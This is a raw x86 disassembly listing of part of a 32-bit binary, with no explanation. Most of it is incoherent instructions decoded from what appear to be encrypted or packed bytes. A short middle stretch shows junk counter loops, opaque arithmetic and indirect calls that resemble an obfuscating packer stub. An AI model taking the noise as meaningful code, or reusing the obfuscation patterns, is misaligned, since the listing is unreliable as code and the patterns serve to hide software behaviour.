  40aaa0:	add    bh,BYTE PTR [ebx+0x65]
  40aaa3:	sbb    esp,DWORD PTR [edi+0x5f7c5ec3]
  40aaa9:	and    BYTE PTR [ebp-0x29],bl
  40aaac:	setns  BYTE PTR [ecx]
  40aaaf:	adc    eax,0x229d45f6
  40aab4:	and    ah,BYTE PTR [ecx]
  40aab6:	fwait
  40aab7:	(bad)  
  40aab8:	mov    ebp,0x999dda2b
  40aabd:	shr    DWORD PTR [eax+0x59940be6],1
  40aac3:	mov    ds:0xb80cc3e2,al
  40aac8:	mov    bh,0x53
  40aaca:	pushf  
  40aacb:	scas   al,BYTE PTR es:[edi]
  40aacc:	sbb    BYTE PTR [ebx],0xbc
  40aacf:	mov    edx,0xc00e4edc
  40aad4:	aas    
  40aad5:	push   0x2c
  40aad7:	pop    ebx
  40aad8:	add    eax,0x7227f32c
  40aadd:	iret   
  40aade:	cmp    ecx,DWORD PTR [esi-0x6e8756d2]
  40aae4:	lods   eax,DWORD PTR ds:[esi]
  40aae5:	or     cl,0xf2
  40aae8:	sub    BYTE PTR [ebx+0x77],bl
  40aaeb:	dec    ebx
  40aaec:	dec    esi
  40aaed:	dec    edi
  40aaee:	pop    ebx
  40aaef:	xor    BYTE PTR ds:0x6a463f49,dh
  40aaf5:	sub    DWORD PTR [esi],0x98bb330c
  40aafb:	addr16 pushf 
  40aafd:	fld    TBYTE PTR [eax]
  40aaff:	stos   BYTE PTR es:[edi],al
  40ab00:	std    
  40ab01:	mov    al,0x3
  40ab03:	pop    eax
  40ab04:	not    BYTE PTR [edx+0x47f37f44]
  40ab0a:	mov    cl,0xfc
  40ab0c:	xor    edx,esp
  40ab0e:	cmp    al,0x17
  40ab10:	or     al,dl
  40ab12:	cmp    al,0xbc
  40ab14:	addr16 clc 
  40ab16:	and    eax,0xa6315d1b
  40ab1b:	sub    DWORD PTR [ecx],ebp
  40ab1d:	sub    eax,0x108c1b8
  40ab22:	adc    eax,0xce9bfa29
  40ab27:	mov    dh,0xf7
  40ab29:	jne    0x40aac9
  40ab2b:	test   BYTE PTR [eax+0x6d27df1a],ah
  40ab31:	dec    eax
  40ab32:	add    eax,0x8e048e81
  40ab37:	mov    cl,0xff
  40ab39:	outs   dx,BYTE PTR ds:[esi]
  40ab3a:	mov    eax,ds:0x66ee3044
  40ab3f:	mov    ?,WORD PTR [ebp-0x4f]
  40ab42:	inc    DWORD PTR [ebp-0x48]
  40ab45:	xor    DWORD PTR [edx],edx
  40ab47:	sbb    DWORD PTR [ebp+0x7d],ebp
  40ab4a:	inc    ebx
  40ab4b:	fiadd  WORD PTR [eax+0x2f]
  40ab4e:	sbb    eax,0xc20be391
  40ab53:	sub    DWORD PTR [edi],edi
  40ab55:	imul   esp,DWORD PTR [esi-0x55],0x20
  40ab59:	xchg   ebx,eax
  40ab5a:	mov    ah,0xae
  40ab5c:	fsubr  DWORD PTR [ebx-0x78681a75]
  40ab62:	dec    eax
  40ab63:	dec    edi
  40ab64:	xchg   esp,eax
  40ab65:	cld    
  40ab66:	adc    DWORD PTR [ebx-0x41],0x21
  40ab6a:	das    
  40ab6b:	test   DWORD PTR [ebp+0x19],esp
  40ab6e:	js     0x40ab62
  40ab70:	add    ebx,esi
  40ab72:	out    dx,eax
  40ab73:	fnstsw WORD PTR [ebx+0x70]
  40ab76:	fcmovb st,st(4)
  40ab78:	add    al,0x49
  40ab7a:	push   ds
  40ab7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab7c:	add    dl,BYTE PTR [edi-0x3bfabf5]
  40ab82:	jmp    0x9d7d:0xbd829ec2
  40ab89:	fwait
  40ab8a:	cmp    eax,0xe48b6a52
  40ab8f:	cmp    DWORD PTR [esi],edx
  40ab91:	call   0x1b74c395
  40ab96:	test   DWORD PTR [edx-0x3710d664],edx
  40ab9c:	push   ebp
  40ab9d:	and    al,BYTE PTR [eax+0x7d595e83]
  40aba3:	mov    dl,0xf9
  40aba5:	pushf  
  40aba6:	jmp    0xe470b6b3
  40abab:	inc    edi
  40abac:	fndisi(8087 only) 
  40abae:	pop    edx
  40abaf:	das    
  40abb0:	in     al,0x1f
  40abb2:	add    BYTE PTR [ecx+0x3ab73f28],bl
  40abb8:	les    esp,FWORD PTR [ecx+0x6c]
  40abbb:	push   0xfba7ab80
  40abc0:	pusha  
  40abc1:	stc    
  40abc2:	stos   BYTE PTR es:[edi],al
  40abc3:	cwde   
  40abc4:	cld    
  40abc5:	mov    cl,0x11
  40abc7:	mov    bl,BYTE PTR [edx-0x6501836d]
  40abcd:	jae    0x40abb7
  40abcf:	xor    al,0x29
  40abd1:	aaa    
  40abd2:	je     0x40abcf
  40abd4:	jecxz  0x40abcb
  40abd6:	lods   al,BYTE PTR ds:[esi]
  40abd7:	cmp    BYTE PTR [esi+0x7a],cl
  40abda:	(bad)  
  40abdb:	cmc    
  40abdc:	into   
  40abdd:	adc    BYTE PTR [esp+edi*8-0x8],dh
  40abe1:	mov    ds,WORD PTR [edi]
  40abe3:	lds    ecx,FWORD PTR [esi]
  40abe5:	test   al,0x94
  40abe7:	enter  0x374b,0xcb
  40abeb:	out    0x2a,eax
  40abed:	into   
  40abee:	prefetch BYTE PTR [ebp+0x13]
  40abf2:	mov    ebx,DWORD PTR cs:[ebx+0x1c1219df]
  40abf9:	mov    al,0x74
  40abfb:	aad    0xdf
  40abfd:	xor    BYTE PTR [edi],0x2c
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fd75,0x42e78f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e783,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fd5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fdfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fd75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e777,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e777,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e777,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e2bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e373
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e777
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e777,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e1a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e1a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e1a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e1a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e377
  40acd5:	cmp    DWORD PTR ds:0x42e1a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e1a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e1b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fd61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fd61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fd61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd81
  40ad3c:	call   DWORD PTR ds:0x42e5cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fd61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fd61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ae18
  40adb4:	test   BYTE PTR [edx],bl
  40adb6:	xlat   BYTE PTR ds:[ebx]
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad6e
  40adc0:	test   DWORD PTR [ebx+0x2fec6d26],esp
  40adc6:	sbb    eax,0x1117bd8b
  40adcb:	(bad)  
  40adcc:	cdq    
  40adcd:	stos   DWORD PTR es:[edi],eax
  40adce:	dec    esp
  40adcf:	pop    ds
  40add0:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add2:	retf   0x8bec
  40add5:	gs loope 0x40ad8b
  40add8:	(bad)  
  40add9:	pop    esi
  40adda:	push   ebp
  40addb:	mov    di,0x9f87
  40addf:	sbb    BYTE PTR [ebx+0x3ca39ba5],cl
  40ade5:	adc    bl,BYTE PTR [ebx+0x532ca665]
  40adeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adec:	or     esi,edi
  40adee:	ss (bad) 
  40adf0:	jecxz  0x40ae66
  40adf2:	(bad)  
  40adf3:	mov    ch,0x5c
  40adf5:	add    DWORD PTR [ecx],0x5f
  40adf8:	rol    BYTE PTR [eax+0x2a],cl
  40adfb:	shr    DWORD PTR [ebx+edx*8],0x1c
  40adff:	jbe    0x40adca
  40ae01:	dec    ecx
  40ae02:	dec    ebp
  40ae03:	ss out 0xd3,al
  40ae06:	and    BYTE PTR [eax+ebx*1-0x4c85461],ch
  40ae0d:	icebp  
  40ae0e:	push   DWORD PTR [esi-0x49e04e9]
  40ae14:	mov    cl,0x2c
  40ae16:	rol    DWORD PTR [edx+0x20],cl
  40ae19:	outs   dx,DWORD PTR ds:[esi]
  40ae1a:	dec    ebp
  40ae1b:	inc    esp
  40ae1c:	jno    0x40adaf
  40ae1e:	mov    BYTE PTR [ecx+esi*8+0x20],bl
  40ae22:	jp     0x40ada5
  40ae24:	addr16 jge 0x40add1
  40ae27:	hlt    
  40ae28:	inc    esi
  40ae29:	mov    dh,0x93
  40ae2b:	loop   0x40adae
  40ae2d:	sbb    al,0xd3
  40ae2f:	in     eax,dx
  40ae30:	mov    cl,0x6
  40ae32:	xchg   ebp,eax
  40ae33:	fwait
  40ae34:	aaa    
  40ae35:	sub    BYTE PTR [esp+edx*8+0x229e0585],dh
  40ae3c:	mov    al,ds:0x9209fa28
  40ae41:	fs mov eax,0x2cabf4d9
  40ae47:	fst    QWORD PTR [ecx-0x5a]
  40ae4a:	mov    al,ds:0xd12cb7e
  40ae4f:	mov    ecx,0xd2536bf0
  40ae54:	adc    eax,0xe9fe19e8
  40ae59:	xor    edx,DWORD PTR [esi]
  40ae5b:	or     ecx,DWORD PTR [ebx+eax*1]
  40ae5e:	dec    esp
  40ae5f:	sar    BYTE PTR [esi-0x61403df4],1
  40ae65:	mov    ch,ch
  40ae67:	jecxz  0x40ae9e
  40ae69:	pop    ebp
  40ae6a:	add    DWORD PTR [ebx+0x51],esi
  40ae6d:	push   cs
  40ae6e:	fwait
  40ae6f:	dec    edi
  40ae70:	(bad)  
  40ae71:	cld    
  40ae72:	push   0xa6b5dc99
  40ae77:	lods   al,BYTE PTR ds:[esi]
  40ae78:	jo     0x40adfb
  40ae7a:	mov    ch,0x6f
  40ae7c:	dec    esi
  40ae7d:	arpl   WORD PTR [eax],dx
  40ae7f:	sub    DWORD PTR [edx-0x72],eax
  40ae82:	dec    ebp
  40ae83:	lock mov ebx,DWORD PTR [edx]
  40ae86:	int    0xee
  40ae88:	leave  
  40ae89:	inc    esp
  40ae8a:	cwde   
  40ae8b:	fist   WORD PTR [edi-0x27]
  40ae8e:	mov    al,0xa2
  40ae90:	ror    DWORD PTR [edi+eax*2+0x4e4bb8b5],0x64
  40ae98:	icebp  
  40ae99:	mov    esp,0x3d7e651c
  40ae9e:	(bad)  [edi+eax*2+0x8]
  40aea2:	push   ecx
  40aea3:	xor    BYTE PTR [edi],bh
  40aea5:	push   edx
  40aea6:	add    eax,0x91a2a4cf
  40aeab:	sub    eax,0xc6bccfc9
  40aeb0:	outs   dx,DWORD PTR ds:[esi]
  40aeb1:	sbb    DWORD PTR [edx+0x37],ebp
  40aeb4:	jecxz  0x40ae78
  40aeb6:	pop    ss
  40aeb7:	lods   al,BYTE PTR ds:[esi]
  40aeb8:	(bad)  
  40aeb9:	jecxz  0x40af26
  40aebb:	add    BYTE PTR ds:0x3b74d3b2,ah
  40aec1:	or     ecx,DWORD PTR [ecx]
  40aec3:	push   ss
  40aec4:	or     ecx,ecx
  40aec6:	or     al,0x5c
  40aec8:	jg     0x40aeb4
  40aeca:	sbb    BYTE PTR [eax+0x3a2ca0e5],0xb8
  40aed1:	ins    DWORD PTR es:[edi],dx
  40aed2:	mov    ecx,0x9794c724
  40aed7:	fstp   DWORD PTR [ecx]
  40aed9:	out    dx,eax
  40aeda:	and    ah,BYTE PTR [ebp-0x1d]
  40aedd:	in     eax,dx
  40aede:	data16 not cl
  40aee1:	xlat   BYTE PTR ds:[ebx]
  40aee2:	xor    DWORD PTR [edi-0x37],eax
  40aee5:	nop
  40aee6:	jp     0x40af5a
  40aee8:	and    ah,cl
  40aeea:	ret    
  40aeeb:	loope  0x40aed2
  40aeed:	fs stos DWORD PTR es:[edi],eax
  40aeef:	in     eax,dx
  40aef0:	stc    
  40aef1:	je     0x40ae8f
  40aef3:	out    dx,eax
  40aef4:	mov    ds:0x45f46154,al
  40aef9:	push   edx
  40aefa:	jae    0x40af39
  40aefc:	and    edi,ebx
  40aefe:	outs   dx,BYTE PTR ds:[esi]
  40aeff:	push   0x593edfe6
  40af04:	cmp    dh,al
  40af06:	outs   dx,DWORD PTR ds:[esi]
  40af07:	sub    BYTE PTR [ecx+0x1604c31b],ah
  40af0d:	push   ebp
  40af0e:	retf   0x2ef4
  40af11:	test   BYTE PTR [ecx+ebp*1+0x7ce23e2a],al
  40af18:	rcl    DWORD PTR [edi],1
  40af1a:	pop    edi
  40af1b:	lods   al,BYTE PTR ds:[esi]
  40af1c:	cmp    al,0x31
  40af1e:	cmp    ecx,DWORD PTR [edx+ecx*2+0x4c792193]
  40af25:	add    BYTE PTR [ebx*1+0x25bf8788],0xaa
  40af2d:	rol    edi,1
  40af2f:	jb     0x40af71
  40af31:	xor    ebx,ebp
  40af33:	dec    ecx
  40af34:	stos   BYTE PTR es:[edi],al
  40af35:	ss sub ebp,esp
  40af38:	fld    QWORD PTR [ebp+0x7ebf622c]
  40af3e:	pop    esi
  40af3f:	das    
  40af40:	outs   dx,DWORD PTR ds:[esi]
  40af41:	dec    esi
  40af42:	add    eax,0xf04bcfcb
  40af47:	test   DWORD PTR [edi],0x443b99a2
  40af4d:	dec    ecx
  40af4e:	dec    edi
  40af4f:	and    DWORD PTR [edi+0x646c55f7],edi
  40af55:	iret   
  40af56:	stos   DWORD PTR es:[edi],eax
  40af57:	retf   0x6325
  40af5a:	add    BYTE PTR [edi],bl
  40af5c:	std    
  40af5d:	jo     0x40af8b
  40af5f:	jbe    0x40af0e
  40af61:	jmp    0xfdcf95c9
  40af66:	in     al,0xf1
  40af68:	sub    eax,0x64d74ac6
  40af6d:	pusha  
  40af6e:	aas    
  40af6f:	loope  0x40af9a
  40af71:	add    cl,BYTE PTR [ebp+0x0]
  40af74:	mov    ebx,0x16f5ebd
  40af79:	push   ds
  40af7a:	push   ecx
  40af7b:	push   cs
  40af7c:	call   0xc30570b1
  40af81:	cmp    dl,bl
  40af83:	mov    edi,0x97abde81
  40af88:	call   esp
  40af8a:	fisttp WORD PTR [esi+edi*8]
  40af8d:	inc    edi
  40af8e:	std    
  40af8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af90:	addr16 mov esp,0x547f0029
  40af96:	pop    edi
  40af97:	pop    edi
  40af98:	pop    esp
  40af99:	xchg   edi,eax
  40af9a:	inc    ebx
  40af9b:	add    edi,0x31b1a7fb
  40afa1:	outs   dx,BYTE PTR ds:[esi]
  40afa3:	fucom  st(5)
  40afa5:	jmp    0xd61807a2
  40afaa:	xchg   DWORD PTR [ecx-0x62],ecx
  40afad:	jne    0x40afae
  40afaf:	imul   edx,esi,0x908ab10f
  40afb5:	mov    BYTE PTR [ebx-0x47b2663f],dl
  40afbb:	adc    eax,0x66f214ce
  40afc0:	push   ebp
  40afc1:	mov    eax,ds:0xd143ab76
  40afc6:	popa   
  40afc7:	sbb    eax,0x8b581c03
  40afcc:	rcl    BYTE PTR [edi-0x53f2a7a2],cl
  40afd2:	mov    DWORD PTR ds:0xdec2826d,ebp
  40afd8:	fdiv   QWORD PTR [esi+ebx*4-0x59]
  40afdc:	mov    esi,0x18e49e0a
  40afe1:	dec    ecx
  40afe2:	add    eax,0x1b7cb4ac
  40afe7:	mov    bl,0xce
  40afe9:	addr16 es test eax,0x69a412b3
  40aff0:	mov    ?,ebx
  40aff2:	push   edi
  40aff3:	jne    0x40afe8
  40aff5:	inc    ecx
  40aff6:	test   al,0xb8
  40aff8:	add    edi,DWORD PTR ds:0x1038f6
  40affe:	imul   ebx,DWORD PTR [edi],0xffffff96
  40b001:	xor    ebx,DWORD PTR [edx-0x4e673b24]
  40b007:	xor    BYTE PTR [ecx-0x30e9825b],bh
  40b00d:	xor    esi,ebx
  40b00f:	cmp    eax,0x21d76e7a
  40b014:	jne    0x40b062
  40b016:	icebp  
  40b017:	sbb    ebx,DWORD PTR [eax]
  40b019:	fwait
  40b01a:	sbb    al,0x5f
  40b01c:	adc    DWORD PTR [esp+esi*4-0x3ff2603e],eax
  40b023:	mov    esi,0xf92540f7
  40b028:	out    dx,al
  40b029:	stos   DWORD PTR es:[edi],eax
  40b02a:	push   0x19
  40b02c:	xor    ecx,eax
  40b02e:	mov    ebx,0x7dd33b3f
  40b033:	cmp    ah,cl
  40b035:	clc    
  40b036:	sbb    al,0x6d
  40b038:	xchg   ebx,eax
  40b039:	mov    al,0x29
  40b03b:	(bad)  
  40b03c:	sub    eax,0x63eba5c8
  40b041:	rol    BYTE PTR [ebp+0x37],cl
  40b044:	test   eax,0xee614444
  40b049:	and    esp,DWORD PTR ds:0x54214e55
  40b04f:	psubw  mm7,QWORD PTR [ecx-0x68]
  40b053:	fisubr WORD PTR [edx+0x2726e7be]
  40b059:	push   esi
  40b05a:	sti    
  40b05b:	sub    DWORD PTR [ecx],ebp
  40b05d:	sbb    esi,esi
  40b05f:	out    dx,al
  40b060:	out    dx,al
  40b061:	add    al,0x8f
  40b063:	shl    DWORD PTR ds:0x32742a29,0x7c
  40b06a:	and    dh,BYTE PTR [eax-0x71]
  40b06d:	jge    0x40b05a
  40b06f:	icebp  
  40b070:	loope  0x40b0d8
  40b072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b073:	cmp    al,0x76
  40b075:	mov    WORD PTR [ebx-0x23],gs
  40b078:	jb     0x40b0f9
  40b07a:	xchg   DWORD PTR ss:[ecx-0x1ddb3724],edi
  40b081:	and    DWORD PTR [ebx+0x2ccb371f],0x97c1f18f
  40b08b:	push   0xffffffad
  40b08d:	cmp    DWORD PTR [edx-0x273e749b],eax
  40b093:	cld    
  40b094:	mov    edi,0xf1f81ee7
  40b099:	test   al,bh
  40b09b:	aas    
  40b09c:	nop
  40b09d:	hlt    
  40b09e:	mov    al,ds:0xcbc53418
  40b0a3:	push   es
  40b0a4:	ficomp WORD PTR [ebx-0x163a32b9]
  40b0aa:	std    
  40b0ab:	je     0x40b112
  40b0ad:	mov    es,WORD PTR [esi]
  40b0af:	aam    0x7e
  40b0b1:	sub    ah,BYTE PTR [edx+0x49]
  40b0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0b5:	sahf   
  40b0b6:	not    BYTE PTR [edi+ebx*4]
  40b0b9:	add    eax,0x29c56deb
  40b0be:	mov    esp,0x33b02689
  40b0c3:	rcr    DWORD PTR [edx+0x1abb8f19],0xab
  40b0ca:	mov    edi,0xd6d69ab7
  40b0cf:	add    dl,BYTE PTR [ebx]
  40b0d1:	loop   0x40b079
  40b0d3:	xlat   BYTE PTR ds:[ebx]
  40b0d4:	jo     0x40b14e
  40b0d6:	lock repnz test DWORD PTR [eax+ebp*2+0x3c],ebx
  40b0dc:	popa   
  40b0dd:	retf   
  40b0de:	into   
  40b0df:	nop
  40b0e0:	in     eax,0x4e
  40b0e2:	hlt    
  40b0e3:	jge    0x40b0f9
  40b0e5:	shr    BYTE PTR [ebp-0x2ef48c79],cl
  40b0eb:	retf   0xa959
  40b0ee:	call   0x2941c9f9
  40b0f3:	mov    cl,BYTE PTR [eax-0x6d]
  40b0f6:	pop    ebp
  40b0f7:	push   esp
  40b0f8:	lods   eax,DWORD PTR ds:[esi]
  40b0f9:	fnstsw WORD PTR [esi+0x1d]
  40b0fc:	in     al,dx
  40b0fd:	sub    edi,esp
  40b0ff:	call   0x9d4a:0x3278f1bd
  40b106:	sahf   
  40b107:	lods   al,BYTE PTR ds:[esi]
  40b108:	aaa    
  40b109:	les    esi,FWORD PTR [ecx+0x40]
  40b10c:	mov    al,0x54
  40b10e:	add    edi,DWORD PTR [ecx]
  40b110:	push   ecx
  40b111:	gs jmp 0x326754e1
  40b117:	dec    ebx
  40b118:	loopne 0x40b151
  40b11a:	sub    ebx,ebx
  40b11c:	or     al,0xe7
  40b11e:	adc    bl,bl
  40b120:	sub    eax,0xeb8b60b
  40b125:	pop    edx
  40b126:	sub    esp,ecx
  40b128:	(bad)  
  40b129:	icebp  
  40b12a:	pop    esi
  40b12b:	xor    BYTE PTR [eax-0x56],bh
  40b12e:	mov    WORD PTR [edi+0x2d],cs
  40b131:	daa    
  40b132:	inc    edi
  40b133:	pop    ebp
  40b134:	sahf   
  40b135:	in     eax,dx
  40b136:	scas   al,BYTE PTR es:[edi]
  40b137:	mov    DWORD PTR [ebx+0x61ce5368],esp
  40b13d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b13e:	xor    ecx,ebp
  40b140:	ds rcl esp,cl
  40b143:	add    al,dh
  40b145:	add    al,0x75
  40b147:	push   edi
  40b148:	bound  edi,QWORD PTR [ecx-0x57]
  40b14b:	xor    al,0x41
  40b14d:	enter  0x439a,0xc
  40b151:	mov    cl,0xd3
  40b153:	xor    al,0xa6
  40b155:	mov    dl,0xfa
  40b157:	repz fisubr DWORD PTR ds:0x70af285b
  40b15e:	loop   0x40b15a
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	(bad)  
  40b174:	imul   DWORD PTR [ecx+0x41]
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b14e
  40b180:	sar    BYTE PTR [esi],1
  40b182:	cmp    DWORD PTR [esp+ebp*1],0xffffffa5
  40b186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b188:	inc    ax
  40b18a:	xor    DWORD PTR [ecx],0xffffff96
  40b18d:	leave  
  40b18e:	sub    DWORD PTR [edi],ebx
  40b190:	sub    BYTE PTR [esi-0x56],cl
  40b193:	jg     0x40b1e8
  40b195:	or     eax,0x17d945d0
  40b19a:	repnz add eax,0xfe839d67
  40b1a0:	xorps  xmm5,xmm5
  40b1a3:	inc    edi
  40b1a4:	push   0xffffffcd
  40b1a6:	rdmsr  
  40b1a8:	sbb    BYTE PTR [edi+0x72],bh
  40b1ab:	lods   al,BYTE PTR ds:[esi]
  40b1ac:	pushf  
  40b1ad:	inc    eax
  40b1ae:	clc    
  40b1af:	push   ecx
  40b1b0:	ror    BYTE PTR [eax+0x786c1a63],1
  40b1b6:	call   0xd61c:0x2023d35
  40b1bd:	sahf   
  40b1be:	sti    
  40b1bf:	sbb    bl,bh
  40b1c1:	add    DWORD PTR [ecx-0x10e88896],esi
  40b1c7:	or     al,0xc7
  40b1c9:	outs   dx,BYTE PTR ds:[esi]
  40b1ca:	stos   BYTE PTR es:[edi],al
  40b1cb:	sti    
  40b1cc:	ja     0x40b17c
  40b1ce:	cmc    
  40b1cf:	sub    dl,BYTE PTR [ecx+ebp*4+0x43b65465]
  40b1d6:	inc    ebp
  40b1d7:	sub    eax,DWORD PTR [esi+0x7d]
  40b1da:	aad    0x2d
  40b1dc:	cmp    dl,bl
  40b1de:	pop    ds
  40b1df:	sub    eax,0x15419f11
  40b1e4:	icebp  
  40b1e5:	jns    0x40b1ea
  40b1e7:	ror    ch,1
  40b1e9:	lea    eax,[ebx+0x43baf76a]
  40b1ef:	jle    0x40b231
  40b1f1:	mov    esi,ds
  40b1f3:	add    al,0xdf
  40b1f5:	fistp  QWORD PTR [ebp-0x15]
  40b1f8:	cmp    al,0x1f
  40b1fa:	cmp    ebp,edx
  40b1fc:	clc    
  40b1fd:	sbb    edi,DWORD PTR [ecx-0x1ed1b353]
  40b203:	mov    ah,al
  40b205:	call   0xa0f4:0xf6600af0
  40b20c:	push   esp
  40b20d:	scas   eax,DWORD PTR es:[edi]
  40b20e:	inc    esi
  40b20f:	std    
  40b210:	ds std 
  40b212:	fwait
  40b213:	jmp    0xda2f:0xd4152eab
  40b21a:	jns    0x40b1c5
  40b21c:	pop    eax
  40b21d:	das    
  40b21e:	xchg   bh,cl
  40b220:	push   edx
  40b221:	lds    esp,FWORD PTR [esi+0x47]
  40b224:	mov    edx,0x9f432ceb
  40b229:	adc    eax,0x56b07f3
  40b22e:	aaa    
  40b22f:	div    BYTE PTR [edi]
  40b231:	sub    bl,BYTE PTR [esi-0x51599802]
  40b237:	mov    WORD PTR [esi+edx*1-0x5acc4d23],?
  40b23e:	mov    gs,esi
  40b240:	add    ebx,ecx
  40b242:	inc    ecx
  40b243:	test   al,0xc1
  40b245:	aam    0x68
  40b247:	adc    bl,BYTE PTR [ebp+0x52]
  40b24a:	cwde   
  40b24b:	sub    al,0x11
  40b24e:	test   al,0xe9
  40b250:	and    ah,BYTE PTR [esp+eiz*2]
  40b253:	packuswb mm4,QWORD PTR [eax+0x1e5d8293]
  40b25a:	mov    ebx,0x53d064
  40b25f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b260:	rcr    BYTE PTR [ebx+eax*4+0x54355137],1
  40b267:	mov    ebx,ebx
  40b269:	jae    0x40b1fb
  40b26b:	mov    eax,ds:0x5b190785
  40b270:	outs   dx,DWORD PTR ds:[esi]
  40b271:	in     al,0x60
  40b273:	shl    BYTE PTR [ebp+0x8dbf31f],cl
  40b279:	jne    0x40b2a3
  40b27b:	pop    edi
  40b27c:	imul   esi,DWORD PTR ds:[esi+0x31],0x18
  40b281:	jge    0x40b260
  40b283:	test   DWORD PTR [edx-0x2a],edx
  40b286:	pop    ebp
  40b287:	repz pop eax
  40b289:	mov    al,ds:0x8295392a
  40b28e:	lds    ebx,FWORD PTR [esi]
  40b290:	adc    dh,BYTE PTR [edx+ecx*4-0x54e78f74]
  40b297:	xchg   BYTE PTR [edx+0xe],ah
  40b29a:	loope  0x40b2d9
  40b29c:	mov    dl,BYTE PTR fs:[ebx+eiz*1]
  40b2a0:	jbe    0x40b2c0
  40b2a2:	in     eax,dx
  40b2a3:	push   esi
  40b2a4:	mul    DWORD PTR ds:0x17d83645
  40b2aa:	xchg   esi,eax
  40b2ab:	fcmovnbe st,st(6)
  40b2ad:	sub    DWORD PTR ds:0xdcdc08bd,eax
  40b2b3:	mov    ds:0x5d1abed4,eax
  40b2b8:	call   0xe82b:0xc577bbec
  40b2bf:	scas   al,BYTE PTR es:[edi]
  40b2c0:	dec    edx
  40b2c1:	mov    ebp,0x249f107f
  40b2c6:	aad    0x3e
